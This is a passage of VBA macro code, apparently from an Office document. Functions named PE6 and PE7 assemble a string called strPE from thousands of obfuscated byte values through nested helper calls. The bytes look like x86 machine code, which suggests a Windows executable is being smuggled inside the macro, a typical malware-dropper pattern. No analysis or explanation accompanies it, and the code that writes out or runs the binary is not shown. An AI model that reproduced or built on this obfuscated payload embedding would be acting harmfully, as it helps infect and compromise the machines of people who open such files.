    strPE = A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 23), 137), 134), "0"), 5), 220), 0), 165), 164), "T"), 231), 0), 137), "*4"), 8), 0), 0), 139), 13), 252), 23), "A;QR"), 232), 181), "."), 0), 0), 139), 216), 133), 219), 15), 132), 200), "!"), 0), "0"), 129), 251), 241), "u"), 9), 0), 236), 132), 133)
    strPE = A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(strPE, "H"), 0), "oO"), 251), 180), 173), 190), "wt"), 160), 139), 21), 248), 23), "A"), 0), 139), 7), 141), "M"), 236), 179), "E_"), 1), 0), 0), 0), 20), "R"), 241), 26), 159), 232), ";("), 0), 0), 139), 7), "P"), 130), "C"), 226), 0), 0), 139), "="), 196)
    strPE = B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(strPE, 2), "A"), 0), 161), 184), 2), ")5G"), 139), 200), "@"), 131), 249), 208), 137), "="), 196), 2), 178), 0), 163), 184), 242), "A"), 217), "~"), 1), 30), 21), 245), 192), 186), 0), "h"), 191), 210), 155), 0), 131), 194), "@R"), 255), 21), 128), 193), 10), 0), "S")
    strPE = B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "h"), 152), 210), "F"), 172), 232), "4"), 228), 255), "J"), 131), 196), 16), "V"), 199), "F"), 8), 0), "i"), 0), 0), 232), "@"), 254), ":"), 255), 131), 196), 142), "_^["), 135), "W"), 232), 255), "/_"), 190), 0), 0), 199), "F"), 26), 0), 0), 0), 0), "4F")
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(strPE, 177), 130), 21), 248), 23), "A"), 0), 141), "M"), 236), 137), "E"), 240), "2"), 7), "QRf"), 199), "E"), 244), ")"), 0), 137), "E"), 248), 137), "u"), 252), 232), "j&"), 0), 0), "_"), 5), "[!"), 229), "]"), 195), "W"), 31), 8), 156), 0), 0), "*"), 139), 21)
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(strPE, 168), 2), "A"), 0), "B"), 155), 137), 21), 168), 2), "A"), 0), 232), ")"), 228), 255), 255), 131), 196), 4), "_^["), 139), "B]"), 153), "D"), 144), 144), 144), 144), 144), 136), "5"), 144), 144), 144), 144), 144), 144), 205), "U"), 139), 236), 131), 236), 182), "V"), 139)
    strPE = A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(strPE, "u"), 8), "W"), 139), "F"), 12), 133), 192), "u"), 34), 139), 134), "$"), 8), 0), "u"), 133), 192), "t"), 24), 161), 180), 2), "A"), 231), 133), 192), 15), 132), "l"), 1), 0), 0), "H"), 163), 180), 2), "A"), 0), "Oa"), 1), 0), 0), 131), "="), 180), 2), 28), 136)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 1), "u"), 12), 139), 138), 16), 163), 140), 2), "h"), 0), 235), "$"), 139), "Q"), 240), 161), 140), 2), "A&d"), 200), "t"), 24), 139), 8), 184), 2), "A"), 0), 161), 192), 2), "h"), 0), "A@"), 137), 13), 184), 2), "A"), 0), 138), 192), 2), "A"), 0), 197)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 185), 161), "A"), 0), 34), 13), 16), 208), "@"), 0), 19), 193), 15), "i"), 23), 1), 0), 0), 210), 138), 200), ">A"), 0), 139), 175), "["), 231), 5), 3), 250), "@"), 163), 172), 2), "A"), 0), 244), 218), ".t"), 0), 163), 160), 11), "A"), 0), 137), 21), 164)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 204), "A"), 0), 137), 144), 244), 8), 173), 0), 139), 21), 164), 204), "r"), 242), 139), 134), 219), 8), 0), 0), 137), 150), 188), 8), "u"), 0), 137), 7), 139), 143), "."), 8), 0), 0), 137), "O"), 4), 139), 142), "8"), 8), 0), 0), 139), 143), "0"), 8), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 139), 150), 207), 8), "^"), 0), "+"), 229), 139), 191), "<"), 8), 181), 0), 27), "o"), 133), 192), 127), 34), "|"), 151), 133), 201), "s"), 4), "3"), 201), "3"), 192), 137), "O"), 215), ")o"), 20), 139), 253), 140), 148), 0), 0), 205), 134), "0"), 8), 0), 0), 2), 150)
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "4"), 8), 0), 0), "+"), 200), 161), 134), "T"), 8), 0), 0), 27), 194), 215), 192), 127), 10), 216), 4), 133), 201), "s"), 4), "3"), 201), "3"), 192), 137), "O"), 24), "jG"), 28), 139), 142), "H"), 8), "L"), 246), 139), 134), "@"), 8), 21), 0), 181), 150), 12), 8)
    strPE = A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(strPE, "f"), 178), 252), 129), "8"), 134), "L"), 128), 0), 0), 27), 194), 186), 192), 127), 10), "|"), 4), "X"), 201), "s"), 4), "3"), 201), "3"), 192), 137), "O"), 8), 137), "G"), 180), "e+"), 20), 208), "@"), 0), 133), 201), "t7"), 139), "="), 172), 2), "A"), 0), 139), 199)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(strPE, 153), 143), 174), 133), "4u("), 139), 21), "l$@"), 0), "W$"), 194), "@h@"), 232), 30), 0), 218), 255), 21), 128), 193), "@"), 0), 161), 200), 192), 245), 0), 131), 19), "@P"), 255), 21), "T"), 193), 143), 0), 131), 196), 16), 161), 248), 23)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "A"), 0), 139), "N"), 4), 227), "U"), 236), 199), "Eq"), 204), 128), 0), 0), "RP"), 137), "M"), 248), 232), 191), "%"), 0), 0), 139), "N"), 4), "Q"), 232), 198), "+"), 0), 0), "V"), 199), "F"), 8), 0), 0), 0), 0), 232), 9), 252), 255), 255), 131), 196), 4)
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "_^"), 27), 229), "]"), 195), "U"), 139), 236), 129), "g"), 160), 0), 0), 153), "S"), 139), "]"), 8), "V"), 141), "E"), 252), "cK"), 4), "(Ph "), 24), "A"), 0), "Q"), 199), "E"), 252), 0), " "), 0), 0), "~"), 184), 240), 0), 0), 139), 240), 131), 254)
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 11), 15), 132), 4), 6), 0), 0), 129), 254), 211), 253), 225), 0), 15), 132), 248), 5), 0), 0), 129), 254), 217), 252), 10), 0), 15), 132), 236), 5), 0), 0), 129), 254), "W"), 253), 10), 0), 232), 132), 224), 5), "&"), 0), 129), 254), "$"), 253), 10), 0), 15)
    strPE = B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 21), 212), 5), 0), 0), 129), 254), 161), 153), 10), 0), 15), 132), 200), 5), 0), "4"), 129), 254), "T#"), 11), 144), "i"), 132), 188), 5), 0), 0), 139), "M"), 252), "3"), 255), ";<"), 182), "%"), 129), 254), 199), 17), "!"), 0), "u"), 29), 139), 21), 180), "F")
    strPE = A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(strPE, "1"), 0), "SB"), 137), 21), 180), 2), "A"), 0), 232), 145), 253), 255), 255), 131), 196), 4), "_^["), 139), 229), "]"), 195), ";"), 247), 138), 127), 213), 13), 200), "wA"), 0), 161), "\"), 2), "A"), 0), "A;"), 199), 137), 13), 200), 2), "AV"), 4)
    strPE = A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "X"), 139), "="), 21), 194), "%"), 208), "SG"), 137), "="), 184), 252), "A"), 243), 232), "Z"), 253), 255), 255), 161), "X"), 2), "."), 0), 131), 196), 4), 131), 248), 1), 204), 140), "P"), 156), "5"), 0), "V"), 141), 149), "`+"), 255), 255), "jxRV0"), 202)
    strPE = B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(strPE, "I"), 0), 0), "P"), 30), 200), 192), "@"), 0), "h"), 12), 233), "@"), 25), 131), 192), "@h"), 172), 212), "@"), 0), 23), 255), ">"), 128), 193), "H"), 0), 131), 196), 20), 207), "^[u"), 11), "]"), 195), "V"), 135), 12), 233), "@"), 157), 232), 186), 153), 226), "o")
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, "RM"), 252), 131), 196), 8), 139), "5"), 144), 2), "A"), 28), "m"), 21), 148), 223), 132), 0), 3), 241), 213), 215), 137), "5"), 144), 2), 248), 0), "%"), 21), 148), 2), "A"), 0), 139), "C"), 12), ";"), 199), "u"), 20), 232), 4), ","), 0), 0), 139), 157), 252), 137)
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 229), "Hv"), 0), 157), 137), 147), 215), 8), 242), "1"), 139), 132), "c"), 139), 131), "("), 8), "l"), 0), 13), "R;"), 133), 137), "Sb"), 15), 133), 192), 2), 0), 0), 139), 204), " N"), 0), 0), 184), 255), 13), 235), 135), "+n"), 160), "l"), 255), 4)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(strPE, 0), 0), ":;"), 193), 19), "E"), 244), "r"), 244), 137), "M"), 244), 139), 147), " "), 8), 0), 0), 139), 233), 222), " "), 24), "A"), 194), 204), "|"), 19), " "), 139), 209), 193), 233), 2), 243), 165), 139), 181), 139), "U"), 244), 131), 225), 3), "+"), 194), 243), 164), 139)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 187), " "), 8), 0), 1), 10), "E"), 236), 225), 250), 139), 207), 137), 187), " "), 8), 0), 0), 159), "D"), 30), " ~"), 161), "X"), 2), "A"), 0), 131), "N"), 2), "|"), 18), 141), 135), " Ph"), 240), 232), 207), 0), 255), 21), "h"), 193), 206), 0), 131), 196)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 8), 18), 133), "8"), 193), "@"), 0), 162), "s "), 207), 252), 232), "@"), 0), "V"), 255), 215), 131), 196), 8), 137), "E"), 248), "&"), 192), 15), 133), 133), 0), 0), 0), "h"), 180), 223), "@"), 0), "$"), 255), 215), 131), 196), 8), 12), 221), 21), 185), 148), 199), "E")
    strPE = B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 240), 2), 0), 0), 0), "ul"), 192), 4), 236), 133), 192), 15), 252), 5), 4), 0), "C"), 161), 248), 23), 14), 0), "$K"), 4), 141), "U`"), 199), "E"), 220), 237), 0), 0), 0), "RP"), 137), "M"), 228), 232), "R#"), 0), 30), 139), "&"), 155), "Q")
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 232), 152), 0), 9), 0), 139), 21), 141), 2), 202), 0), 161), 184), 2), "A"), 0), "B"), 137), 21), 208), 2), "A"), 0), 139), 208), 222), 131), 250), 10), 163), 184), 2), "A"), 0), "~"), 13), "h"), 183), 210), "C"), 0), 232), "x"), 216), 255), 16), 131), 196), 4), 169)
    strPE = A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 225), "wR"), 255), 255), 131), 149), 4), 203), 213), 1), 200), 1), 0), 156), "Q"), 180), 2), 11), 0), 133), 168), "u"), 221), "h"), 224), 232), "@"), 11), "V"), 255), 215), 131), 196), 8), 186), 224), 19), "A"), 0), 221), "jt"), 23), 138), "H"), 8), 131), "<"), 8)
    strPE = A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 128), 249), " ~"), 12), 19), 10), 3), "H"), 1), 223), "@"), 128), 249), " "), 177), 244), 198), "{"), 0), "h"), 216), 232), 247), 0), "V"), 255), 215), 139), 228), "6"), 239), 8), 133), 210), "t"), 197), 139), 250), 131), 201), "[3"), 192), "x"), 174), 247), "TI"), 183)
    strPE = A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(strPE, 249), "3"), 127), 233), 131), 194), ")j0"), 141), "EoRP"), 255), 21), 158), 193), "@"), 0), 139), "=8"), 182), "n"), 0), 135), 172), 12), 198), "E"), 11), 0), 235), 254), 233), "=8"), 193), "@"), 0), 7), 13), 212), 232), "l"), 0), "8M"), 8)
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(strPE, 138), "E"), 8), "<23"), 20), 2), "A"), 0), 252), 29), 139), 13), 208), 2), "I"), 0), "A"), 131), "A"), 9), 137), 13), 208), 2), 193), "J|"), 34), "3"), 9), 8), "Rh"), 172), 232), "X"), 0), 235), 14), 131), 248), 3), "|"), 201), 141), 14), 8), "+")
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(strPE, "h"), 144), 232), "\"), 0), 255), 29), 1), 193), "@"), 0), 131), 196), 8), 139), 12), 248), 199), 131), "("), 8), 0), 0), 1), 133), "k"), 0), 198), 1), "u"), 161), "h"), 2), "A"), 0), 231), 192), 15), 132), 205), 0), 0), 0), "h"), 223), 246), "@"), 244), "V"), 255)
    strPE = A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 215), 229), "9"), 235), 133), 192), "u"), 15), "hx"), 232), "@"), 0), "V"), 255), 215), 131), 196), 8), "e"), 244), "tbhh"), 232), "@"), 137), "V"), 255), 215), 139), 248), 131), 196), 8), 133), 255), "u"), 21), "hX"), 232), "@"), 0), "V"), 24), 21), "8"), 193)
    strPE = A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(strPE, "@"), 0), 139), 248), 131), 196), 203), 9), 255), "t+"), 199), "r$"), 8), 0), 0), 1), 0), 0), 0), 143), "`"), 2), "A"), 0), 133), 192), 238), 253), 141), 232), 16), "R"), 255), 195), 250), 193), "@"), 0), 131), 129), 190), 214), 2), "3"), 192), "o"), 255), 137)
    strPE = A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(strPE, "C"), 28), "u"), 17), 199), 131), "$Q"), 0), 0), 1), 0), 0), 0), 199), 3), 28), 0), 0), 0), 0), 139), "E"), 252), 139), "u"), 248), "UU"), 244), 139), 197), 240), 209), 198), 139), 22), 173), "+"), 194), "+"), 131), 139), 167), " n"), 0), 0), 3), 195)
    strPE = B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 141), "T"), 8), "l"), 3), 242), 137), "s"), 16), 139), 13), 152), 232), "A"), 0), 139), "u#"), 200), 161), 141), 2), "A"), 0), 152), 208), 0), "Y"), 13), 152), 207), "A"), 0), "3"), 255), 254), 29), 139), "s"), 16), 3), 241), 137), "s"), 16), 139), 21), 152), 2), "A")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "N"), 161), 156), 2), "A"), 0), 3), 209), 137), 21), 152), 2), "A"), 0), 19), 199), 163), 156), 2), "A"), 204), "9"), 187), "$"), 8), 176), 0), 15), 132), 208), 20), 0), 0), 139), "C"), 16), 139), "K"), 150), 7), 193), 23), 130), 194), 1), 0), 0), 161), 180), 2)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "A"), 0), 150), 131), 248), 1), 163), 180), 131), "A"), 0), 169), 207), 139), "K"), 210), 137), 13), 140), 2), "A"), 0), "["), 209), 139), "S"), 16), 161), "3"), 2), "A"), 0), ";"), 208), "t"), 248), 139), 13), 184), 2), 234), 251), 161), 192), 2), "A"), 0), "A_o")
    strPE = B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 13), 184), 2), "A"), 0), 163), "o"), 2), "A"), 0), 161), 172), 2), "A"), 0), "2"), 13), 16), 208), "@"), 0), ";"), 193), 15), 141), 19), 1), 0), 234), 139), 13), 200), 22), "A"), 0), 134), "|"), 193), "v9"), 3), 241), 139), 199), 2), 203), 0), 0), "@k")
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(strPE, 163), "m"), 2), "k"), 0), 137), 13), 176), 157), "A"), 0), 232), 180), "("), 0), 169), 137), "7"), 250), 8), 0), 0), ">"), 131), "0"), 8), 0), 9), 137), 147), "T"), 8), 0), 0), 137), 6), 138), 139), "4"), 8), 195), 0), 137), "@"), 4), 139), 139), 149), 8), 182)
    strPE = B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 0), 139), 131), "0"), 8), 249), 0), 139), 147), "4"), 8), 0), 0), "+1"), 139), 131), "<"), 8), 0), 0), 27), 194), ";"), 199), 127), 10), "|"), 4), ";"), 207), "s"), 4), "3"), 201), "3"), 192), 137), "Z"), 16), 137), "F"), 20), 139), 139), "P"), 8), 0), 227), "_")
    strPE = B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 131), 245), 8), 29), 0), 139), 147), "4"), 8), 0), 0), "+"), 200), 139), 131), 28), "@"), 143), 0), 27), 194), ";"), 199), 127), 10), "|"), 4), ";"), 207), "s"), 4), "3"), 201), "3"), 192), "cN"), 24), 137), "Fj"), 139), 139), "H"), 8), 0), 0), 139), 131), "@")
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(strPE, "C"), 0), 0), 139), 5), 130), 8), "N"), 0), "+"), 200), 139), 131), "L"), 8), 0), 0), 27), 194), ";"), 199), 127), 10), "q"), 4), "("), 207), "s"), 4), 216), 201), "3"), 192), 137), "?"), 8), 217), "F"), 12), 139), 13), 20), 208), "@I;"), 207), 140), "7"), 139)
    strPE = B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(strPE, "5"), 128), 2), "A"), 0), 139), 242), 153), 247), 249), 207), "qV("), 230), 21), 200), 192), "@"), 0), "Vk"), 194), "@h@"), 196), "@"), 163), "S"), 255), 21), 128), 193), "@"), 0), 161), 200), 192), "@"), 0), 131), 192), "@P"), 199), 21), "T"), 193), "@")
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(strPE, 22), 131), "M"), 16), 137), 187), "9"), 8), 0), 0), 137), "{"), 28), 137), 187), "("), 8), 0), 3), 137), "; "), 8), 0), 0), 137), 242), 16), 171), "{"), 12), 232), 166), "T"), 0), 0), "h"), 160), 11), 235), 0), 137), 21), 164), 11), "A"), 0), 188), 131), "2")
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(strPE, 8), "N"), 0), 11), 160), 164), 11), "A"), 0), 137), 139), "<"), 8), 197), 0), 139), 155), 160), 11), "A"), 0), 137), 147), "0"), 162), 130), 0), 161), 164), 11), "A"), 0), 185), 137), 131), "4F"), 0), 0), 232), 12), 220), 255), 255), 131), 196), 235), "_^[")
    strPE = A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 139), 229), "]"), 143), 197), 144), 9), 136), 201), 255), "}"), 232), 139), "5"), 130), 193), "@"), 0), 133), 192), "u&h"), 216), "P@Ph"), 180), 234), "@"), 0), 255), 214), "hh"), 17), "@"), 0), 255), " h "), 234), 181), 0), 241), 214), "h"), 128)
    strPE = A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 212), 224), 0), 255), 214), 131), 196), 20), 200), "Dh"), 20), 234), "@"), 146), 255), 214), "h"), 0), 234), "@"), 0), "hD"), 212), 242), 0), "h"), 200), 233), "v"), 0), 255), 9), "hx"), 233), 147), 0), 208), 214), "i("), 233), "@"), 255), 255), 213), "h"), 28)

    PE6 = strPE
End Function

Private Function PE7() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 249), 207), 0), 255), 214), 131), 196), 28), 24), 195), 144), 144), 213), 144), 215), 144), 173), 144), "US"), 236), 139), "E"), 8), 139), 13), 200), 192), "@"), 0), "V"), 139), "5"), 128), 193), "@"), 0), "P"), 131), 193), "@hd"), 242), "@"), 0), "Q"), 255), 203), 139)
    strPE = A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 21), 217), 192), "@"), 0), 199), "T"), 242), "@"), 15), 131), 194), 30), 8), 170), 214), 161), 164), 192), "@"), 0), "hr"), 242), "@"), 0), "|"), 192), "@P"), 255), 10), 139), 13), 17), 224), "@"), 0), "h"), 228), 241), "@L"), 131), 193), "@Q"), 255), 214), 139)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 149), 200), 192), "@"), 0), 130), "D"), 241), 4), 0), 131), 194), "@"), 188), 255), 214), 161), 200), 192), "@"), 159), "hl"), 241), "@"), 0), 131), 192), "@P"), 255), "f"), 139), 13), 200), "!@Oh "), 241), 227), 1), 131), 193), "@Q"), 255), "!"), 139)
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(strPE, 21), 165), 192), "@"), 198), "h"), 208), ";"), 169), "s"), 131), 194), "@R"), 255), 214), 161), 237), 192), 131), 0), 131), 196), "D"), 131), 192), "@h"), 148), 169), "@"), 0), "P"), 255), 214), 139), 4), 31), 192), "@"), 0), "hX"), 240), 211), 0), 131), 216), "EQ")
    strPE = A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(strPE, 255), "h"), 139), 212), 200), "!@"), 0), "h("), 240), "@R"), 131), 194), "@R"), 255), 214), 161), 200), 192), 201), " h"), 135), 128), "@"), 0), 131), 251), "@P"), 255), 214), 139), 31), 200), 192), "@"), 0), "\"), 180), 8), 143), 0), 131), 193), "@"), 189)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 255), 214), 139), 21), 200), 192), 145), 0), "h"), 132), 239), "@"), 0), 131), 194), "@R"), 255), 214), 161), 200), 192), "@"), 0), "h"), 211), 239), "@"), 0), 239), 192), "@P"), 255), 214), "h"), 16), 239), 208), 0), 139), 13), 249), 192), "@"), 0), 131), "O@Q")
    strPE = A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 255), 214), "}"), 21), 200), 192), "@"), 0), 131), 196), "@"), 131), 194), "@"), 24), 208), 238), "@4R"), 255), 214), "`"), 200), 192), 154), 0), "N"), 144), "V@"), 0), 174), 192), "FP:"), 214), 139), 13), 200), 145), "@"), 0), "h@"), 238), "@M"), 131)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(strPE, 204), "@t"), 255), 214), 139), 21), 200), 192), "@"), 17), "h"), 203), 237), "@"), 0), 131), 194), "]R"), 255), 203), 161), 200), 192), "@"), 0), "h"), 168), 29), "@"), 0), 131), 173), "vPs"), 214), 241), 13), 200), 19), "@"), 0), "h`"), 237), 161), 0), 131)
    strPE = B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(strPE, 193), "@Q"), 6), 214), 139), 21), 200), 192), "@"), 6), "I"), 24), 237), "@"), 0), 131), 194), "@R"), 255), 214), 161), 200), "W"), 169), 0), "h`"), 237), "@"), 0), 131), 192), "@'z"), 214), 27), 13), 1), 192), "d"), 0), 131), 196), "@"), 131), 193), "`")
